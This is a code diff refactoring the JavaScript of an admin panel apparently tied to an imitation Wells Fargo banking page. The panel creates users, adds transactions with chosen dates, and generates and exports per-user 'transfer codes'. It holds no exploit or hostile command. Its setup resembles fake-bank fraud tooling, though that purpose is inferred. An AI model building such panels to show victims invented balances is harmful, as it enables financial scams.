+  const list    = document.getElementById('user-codes-list');
+  if (!userId) { if (section) section.style.display = 'none'; return; }
 
   const userCodes = codes.filter(c => c.userId === userId);
-  const userCodesSection = document.getElementById('user-codes-section');
-  const userCodesList = document.getElementById('user-codes-list');
-
-  if (userCodesSection && userCodesList) {
-    if (userCodes.length > 0) {
-      userCodesSection.style.display = 'block';
-      userCodesList.innerHTML = userCodes.map(c => {
-        const statusClass = c.used ? 'used' : '';
-        const statusText = c.used ? 'Used' : 'Active';
-        const statusColor = c.used ? '#2e7d32' : '#f57f17';
-        return `<div class="generated-code-item ${statusClass}">
-          <div class="code-info">
-            <div class="code-num">${c.code}</div>
-            <div class="code-meta">Created: ${formatDate(c.createdAt)}${c.used ? ' | Used: ' + formatDate(c.usedAt) : ''}</div>
-          </div>
-          <div class="code-actions">
-            <span class="code-status" style="color:${statusColor};font-weight:600;">${statusText}</span>
-          </div>
-        </div>`;
-      }).join('');
-    } else {
-      userCodesSection.style.display = 'block';
-      userCodesList.innerHTML = '<div class="alert alert-info">No transfer codes for this user yet. Generate one above.</div>';
-    }
+  if (section && list) {
+    section.style.display = 'block';
+    list.innerHTML = userCodes.length > 0 ? userCodes.map(c => `
+      <div class="generated-code-item ${c.used ? 'used' : ''}">
+        <div class="code-info">
+          <div class="code-num">${c.code}</div>
+          <div class="code-meta">Created: ${formatDate(c.createdAt)}${c.used ? ' · Used: ' + formatDate(c.usedAt) : ''}</div>
+        </div>
+        <div class="code-actions">
+          <span class="code-status" style="color:${c.used?'#2e7d32':'#f57f17'};font-weight:600">${c.used ? 'Used ✓' : 'Active'}</span>
+        </div>
+      </div>`).join('') : '<div class="alert alert-info">No codes for this user yet.</div>';
   }
 }
 
 function loadAllCodes() {
-  const codesGrid = document.getElementById('all-codes-grid');
-  if (!codesGrid) return;
-
+  const grid = document.getElementById('all-codes-grid');
+  if (!grid) return;
   if (codes.length > 0) {
-    const allCodesSorted = [...codes].sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
-    codesGrid.innerHTML = allCodesSorted.map(c => {
-      const u = users.find(user => user.id === c.userId) || {};
-      const cardClass = c.used ? 'used' : '';
-      const statusClass = c.used ? 'badge-danger' : 'badge-success';
-      const statusText = c.used ? 'Used' : 'Active';
-      return `<div class="code-card ${cardClass}">
+    const sorted = [...codes].sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt));
+    grid.innerHTML = sorted.map(c => {
+      const u = users.find(u => u.id === c.userId) || {};
+      return `<div class="code-card ${c.used ? 'used' : ''}">
         <div class="code">${c.code}</div>
-        <div class="code-status">${u.name || 'Unknown'} | <span class="badge ${statusClass}">${statusText}</span></div>
+        <div class="code-status">${u.name||'Unknown'} &nbsp;|&nbsp; <span class="badge ${c.used?'badge-danger':'badge-success'}">${c.used?'Used':'Active'}</span></div>
         <div class="code-date">${formatDate(c.createdAt)}</div>
       </div>`;
     }).join('');
   } else {
-    codesGrid.innerHTML = '<div class="alert alert-info">No transfer codes generated yet.</div>';
+    grid.innerHTML = '<div class="alert alert-info">No transfer codes yet.</div>';
   }
 }
 
 function exportCodes() {
-  const activeCodes = codes.filter(c => !c.used);
-  if (activeCodes.length === 0) {
-    toast('No active codes to export.', true);
-    return;
-  }
-
-  let csv = 'Code,User,Created,Status\n';
-  activeCodes.forEach(c => {
-    const u = users.find(user => user.id === c.userId) || {};
-    csv += `${c.code},${u.name || 'Unknown'},${c.createdAt},${c.used ? 'Used' : 'Active'}\n`;
+  const active = codes.filter(c => !c.used);
+  if (!active.length) { toast('No active codes to export.', true); return; }
+  let csv = 'Code,User,Username,Created\n';
+  active.forEach(c => {
+    const u = users.find(u => u.id === c.userId) || {};
+    csv += `${c.code},${u.name||'Unknown'},${u.username||''},${c.createdAt}\n`;
   });
-
   const blob = new Blob([csv], { type: 'text/csv' });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = 'transfer-codes-' + new Date().toISOString().split('T')[0] + '.csv';
-  a.click();
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement('a');
+  a.href = url; a.download = 'transfer-codes-' + Date.now() + '.csv'; a.click();
   URL.revokeObjectURL(url);
-  toast('Codes exported successfully!');
-}
-
-// ── DEBUG FUNCTIONS ──
-function openBankingPage() {
-  const pages = ['index.html', 'wells-fargo-banking.html', 'banking.html'];
-  for (const page of pages) {
-    if (confirm('Open ' + page + '?')) {
-      window.open(page, '_blank');
-      break;
-    }
-  }
+  toast('Codes exported!');
 }
 
 function clearAllData() {
-  if (confirm('Are you sure you want to clear ALL data?')) {
+  if (confirm('Are you sure you want to clear ALL data? This cannot be undone.')) {
     localStorage.removeItem(STORE_KEY);
+    localStorage.removeItem('wf_session');
     initDB();
     loadData();
     toast('All data cleared and reset!');
   }
 }
 
-function showLocalStorage() {
-  const db = loadDB();
-  alert('localStorage["wf_db"] contains:\n\n' + JSON.stringify(db, null, 2));
-}
-
 // ── EVENT LISTENERS ──
 document.addEventListener('DOMContentLoaded', function() {
-  // Initialize
-  initSupabase();
   initDB();
   loadData();
 
-  // Set default date
-  const txnDateInput = document.getElementById('txn-date');
-  if (txnDateInput) {
-    txnDateInput.valueAsDate = new Date();
-  }
+  document.getElementById('txn-date').valueAsDate = new Date();
 
   // Navigation
-  document.getElementById('nav-dashboard').addEventListener('click', function(e) { e.preventDefault(); showSection('dashboard'); });
-  document.getElementById('nav-users').addEventListener('click', function(e) { e.preventDefault(); showSection('users'); });
-  document.getElementById('nav-transactions').addEventListener('click', function(e) { e.preventDefault(); showSection('transactions'); });
-  document.getElementById('nav-add-transaction').addEventListener('click', function(e) { e.preventDefault(); showSection('add-transaction'); });
-  document.getElementById('nav-transfer-codes').addEventListener('click', function(e) { e.preventDefault(); showSection('transfer-codes'); });
-  document.getElementById('nav-open-banking').addEventListener('click', function(e) { e.preventDefault(); openBankingPage(); });
+  document.getElementById('nav-dashboard').addEventListener('click', e => { e.preventDefault(); showSection('dashboard'); });
+  document.getElementById('nav-users').addEventListener('click', e => { e.preventDefault(); showSection('users'); });
+  document.getElementById('nav-transactions').addEventListener('click', e => { e.preventDefault(); showSection('transactions'); });
+  document.getElementById('nav-add-transaction').addEventListener('click', e => { e.preventDefault(); showSection('add-transaction'); });
+  document.getElementById('nav-transfer-codes').addEventListener('click', e => { e.preventDefault(); showSection('transfer-codes'); });
 
   // Mobile menu
-  document.getElementById('mobile-menu-btn').addEventListener('click', function() {
-    document.getElementById('admin-nav').classList.toggle('open');
-  });
+  document.getElementById('mobile-menu-btn').addEventListener('click', () => document.getElementById('admin-nav').classList.toggle('open'));
 
-  // Buttons
-  document.getElementById('add-user-btn').addEventListener('click', function() { openModal('add-user'); });
-  document.getElementById('view-all-txns').addEventListener('click', function() { showSection('transactions'); });
-  document.getElementById('add-txn-nav').addEventListener('click', function() { showSection('add-transaction'); });
+  // Dashboard buttons
+  document.getElementById('view-all-txns').addEventListener('click', () => showSection('transactions'));
+  document.getElementById('add-txn-nav').addEventListener('click',   () => showSection('add-transaction'));
 
-  // Modal buttons
-  document.getElementById('close-add-user').addEventListener('click', function() { closeModal('add-user'); });
-  document.getElementById('cancel-add-user').addEventListener('click', function() { closeModal('add-user'); });
-  document.getElementById('confirm-add-user').addEventListener('click', addUser);
+  // Add user modal
+  document.getElementById('add-user-btn').addEventListener('click',      () => openModal('add-user'));
+  document.getElementById('close-add-user').addEventListener('click',    () => closeModal('add-user'));
+  document.getElementById('cancel-add-user').addEventListener('click',   () => closeModal('add-user'));
+  document.getElementById('confirm-add-user').addEventListener('click',  addUser);
 
-  document.getElementById('close-edit-user').addEventListener('click', function() { closeModal('edit-user'); });
-  document.getElementById('cancel-edit-user').addEventListener('click', function() { closeModal('edit-user'); });
-  document.getElementById('save-edit-user').addEventListener('click', saveUser);
+  // Edit user modal
+  document.getElementById('close-edit-user').addEventListener('click',   () => closeModal('edit-user'));
+  document.getElementById('cancel-edit-user').addEventListener('click',  () => closeModal('edit-user'));
+  document.getElementById('save-edit-user').addEventListener('click',    saveUser);
 
   // Transaction form
-  document.getElementById('submit-txn').addEventListener('click', function(e) {
-    e.preventDefault();
-    addTransaction();
-  });
-  document.getElementById('cancel-txn').addEventListener('click', function() {
+  document.getElementById('submit-txn').addEventListener('click', e => { e.preventDefault(); addTransaction(); });
+  document.getElementById('cancel-txn').addEventListener('click', () => {
     document.getElementById('add-txn-form').reset();
     document.getElementById('txn-date').valueAsDate = new Date();
     showSection('transactions');
   });
 
-  // Code user select change
+  // Transfer codes
   document.getElementById('code-user').addEventListener('change', loadUserCodes);
   document.getElementById('generate-codes-btn').addEventListener('click', generateCodes);
   document.getElementById('refresh-codes').addEventListener('click', loadUserCodes);
   document.getElementById('export-codes').addEventListener('click', exportCodes);
 
-  // Debug tools
-  document.getElementById('open-banking').addEventListener('click', openBankingPage);
+  // Debug
   document.getElementById('refresh-data').addEventListener('click', refreshData);
   document.getElementById('clear-data').addEventListener('click', clearAllData);
-  document.getElementById('show-storage').addEventListener('click', showLocalStorage);
+  document.getElementById('show-storage').addEventListener('click', () => alert('localStorage["wf_db"]:\n\n' + JSON.stringify(loadDB(), null, 2)));
 
-  // Modal close on background click
-  document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
-    overlay.addEventListener('click', function(e) {
-      if (e.target === overlay) {
-        overlay.classList.remove('on');
-      }
-    });
+  // Modal close on backdrop click
+  document.querySelectorAll('.modal-overlay').forEach(overlay => {
+    overlay.addEventListener('click', e => { if (e.target === overlay) overlay.classList.remove('on'); });
   });
 });
 </script>
